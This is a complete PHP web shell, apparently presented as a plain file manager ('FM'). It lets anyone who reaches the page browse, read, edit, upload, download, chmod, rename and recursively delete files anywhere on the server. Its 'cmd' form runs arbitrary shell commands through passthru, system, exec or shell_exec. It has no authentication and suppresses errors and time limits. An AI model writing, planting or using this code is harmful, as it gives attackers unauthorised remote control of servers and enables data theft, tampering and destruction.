<?php
error_reporting(0);
@set_time_limit(0);
$R = @str_replace('\\','/', dirname($_SERVER['SCRIPT_FILENAME']));
$q = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
if (substr($q,0,6)==='go=') { /* reserved */ }

/* --- tiny helpers ------------------------------------------------------ */
$run = function($c){ $o=''; if(function_exists('passthru')){ @ob_start(); @passthru($c); $o=@ob_get_clean(); } elseif(function_exists('system')){ @ob_start(); @system($c); $o=@ob_get_clean(); } elseif(function_exists('exec')){ @exec($c,$x); $o=implode("\n",$x);} elseif(function_exists('shell_exec')){ $o=@shell_exec($c);} return $o!==null?$o:''; };
$h = function($s){ return htmlspecialchars($s, ENT_QUOTES); };
function esc(&$v){ if(is_string($v)) $v=htmlspecialchars($v,ENT_QUOTES); }
$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
$p   = isset($_GET['p'])    ? @realpath($_GET['p']) : $R;
if(!$p || !is_dir($p)) $p = $R;
$f   = isset($_POST['f']) ? @realpath($_POST['f'])
     : (isset($_GET['f']) ? @realpath($_GET['f']) : '');
$a   = isset($_POST['a']) ? $_POST['a'] : '';
$out = '';
$err = '';

/* --- actions ----------------------------------------------------------- */
if($a==='save' && $f && isset($_POST['data'])){
  if(@file_put_contents($f, $_POST['data'])!==false) $err='<span style="color:#0a0">saved: '.$h($f).'</span>';
  else $err='<span style="color:#a00">write failed</span>';
}
if($a==='mkdir' && isset($_POST['name']) && $p){ $n=$p.'/'.trim($_POST['name']); if(!is_dir($n)) @mkdir($n); $err='mkdir: '.$h($n); }
if($a==='delete' && $f){ if(is_dir($f)){ $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST); foreach($it as $x){ $x->isDir()?@rmdir($x->getPathname()):@unlink($x->getPathname()); } @rmdir($f); } else @unlink($f); $err='deleted: '.$h(basename($f)); $f=''; }
if($a==='rename' && isset($_POST['newname']) && $f){ $nn=$p.'/'.trim($_POST['newname']); if($f!==$nn) @rename($f,$nn); $err='renamed to: '.$h(basename($nn)); $f=''; }
if($a==='chmod' && isset($_POST['mode']) && $f){ @chmod($f, octdec($_POST['mode'])); $err='chmod ok'; }
if($a==='up' && isset($_FILES['upf']) && $p){ $t=$p.'/'.basename($_FILES['upf']['name']); if(move_uploaded_file($_FILES['upf']['tmp_name'],$t)) $err='uploaded: '.$h(basename($t)); else $err='upload failed'; }

$editing = ($f && is_file($f)) ? file_get_contents($f) : '';
$fmode = is_file($f) ? substr(sprintf('%o',@fileperms($f)),-4) : '';
?>
<!DOCTYPE html><html lang="en"><head>
<meta charset="utf-8"><title>FM / <?php echo $h(basename($p)); ?></title>
<style>
body{font-family:monospace;background:#111;color:#d7d7d7;margin:0}
a{color:#7fb3ff;text-decoration:none}a:hover{text-decoration:underline}
.wrap{max-width:1100px;margin:12px auto;padding:12px}
.top{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #333;padding-bottom:8px;margin-bottom:10px}
.crumb{color:#9ae;word-break:break-all}
.crumb a{color:#7fb3ff}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{text-align:left;padding:4px 6px;border-bottom:1px solid #262626}
th{color:#999}
td a{margin-right:8px}
.dir{color:#ffd479}
.f{color:#d7d7d7}
.forms{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0;align-items:center}
.forms input,.forms button{background:#222;color:#ddd;border:1px solid #444;padding:5px 8px;border-radius:3px}
.forms button{background:#2c3e6b;cursor:pointer}
.box{background:#0c0c0c;border:1px solid #2a2a2a;border-radius:4px;padding:10px;margin-top:12px}
textarea{width:100%;height:360px;background:#0a0a0a;color:#cfc;border:1px solid #333;font-family:monospace;font-size:12px}
pre.out{background:#0a0a0a;border:1px solid #2a2a2a;padding:8px;overflow:auto;max-height:420px;font-size:12px}
code{color:#8f8}
.note{color:#888;font-size:11px}
</style></head><body><div class="wrap">

<div class="top">
  <div class="crumb"><?php
    $parts = explode('/', trim($p,'/'));
    $acc='';
    echo '<a href="?">/</a>';
    foreach($parts as $pt){ $acc.='/'.$pt; echo '<a href="?p='.urlencode($acc).'">'.$h($pt).'</a>/'; }
  ?></div>
  <div class="note"><?php echo $h($p); ?></div>
</div>

<div class="forms">
  <form method="post" style="display:inline"><input type="hidden" name="a" value="mkdir"><input name="name" placeholder="new folder"><button>mkdir</button></form>
  <form method="post" enctype="multipart/form-data" style="display:inline"><input type="hidden" name="a" value="up"><input type="file" name="upf"><button>upload</button></form>
  <span id="res" class="note"><?php echo $err; ?></span>
</div>

<table>
<tr><th>Name</th><th>Size</th><th>Mode</th><th>Actions</th></tr>
<?php
$items=array();
foreach((array)@scandir($p) as $e){ if($e==='.'||$e==='..')continue; $ep=$p.'/'.$e; $items[]=array('n'=>$e,'p'=>$ep,'d'=>is_dir($ep),'s'=>is_file($ep)?filesize($ep):'-','m'=>substr(sprintf('%o',@fileperms($ep)),-4)); }
function cmp_($a,$b){ if($a['d']!=$b['d']) return $a['d']?-1:1; return strnatcasecmp($a['n'],$b['n']); }
usort($items,'cmp_');
foreach($items as $it){
  $enc=urlencode($it['p']);
  echo '<tr><td>';
  if($it['d']) echo '<a class="dir" href="?p='.$enc.'">'.$h($it['n']).'/</a>';
  else echo '<a class="f" href="?p='.urlencode($p).'&f='.$enc.'">'.$h($it['n']).'</a>';
  echo '</td><td>'.$it['s'].'</td><td>'.$it['m'].'</td><td>';
  if(!$it['d']){ echo '<a href="?p='.urlencode($p).'&f='.$enc.'">edit</a><a href="?p='.urlencode($p).'&f='.$enc.'&dl=1">dl</a>'; }
  echo '<a href="?p='.urlencode($p).'&f='.$enc.'&rm=1">rm</a>';
  echo '</td></tr>';
}
?>
</table>

<?php if($f && is_file($f) && !isset($_GET['rm'])): ?>
<div class="box"><b>Edit:</b> <code><?php echo $h($f); ?></code> (<?php echo @filesize($f); ?>B)
<form method="post"><input type="hidden" name="a" value="save"><input type="hidden" name="f" value="<?php echo $h($f); ?>">
<textarea name="data"><?php echo $h($editing); ?></textarea>
<button>Save</button></form>
</div>
<?php endif; ?>

<?php if(isset($_GET['dl']) && $f && is_file($f)){ @header('Content-Type: application/octet-stream'); @header('Content-Disposition: attachment; filename="'.basename($f).'"'); @readfile($f); exit; } ?>

<?php if(isset($_GET['rm']) && $f): ?>
<div class="box"><form method="post"><input type="hidden" name="a" value="delete"><input type="hidden" name="f" value="<?php echo $h($f); ?>">
Delete <code><?php echo $h(basename($f)); ?></code> ? <button>Yes</button></form>
<form method="post" style="margin-top:6px"><input type="hidden" name="a" value="rename"><input type="hidden" name="f" value="<?php echo $h($f); ?>"><input name="newname" value="<?php echo $h(basename($f)); ?>"><button>rename</button></form>
<form method="post" style="margin-top:6px"><input type="hidden" name="a" value="chmod"><input type="hidden" name="f" value="<?php echo $h($f); ?>"><input name="mode" value="<?php echo $h($fmode); ?>" size="5"><button>chmod</button></form>
</div>
<?php endif; ?>

<div class="box"><b>cmd:</b>
<form method="post"><input name="cmd" value="<?php echo $h($cmd); ?>" style="width:70%;background:#222;color:#ddd;border:1px solid #444;padding:5px"><button>run</button></form>
<?php if($cmd!==''){ echo '<pre class="out">'.$h($run($cmd)).'</pre>'; } ?>
</div>

</div></body></html>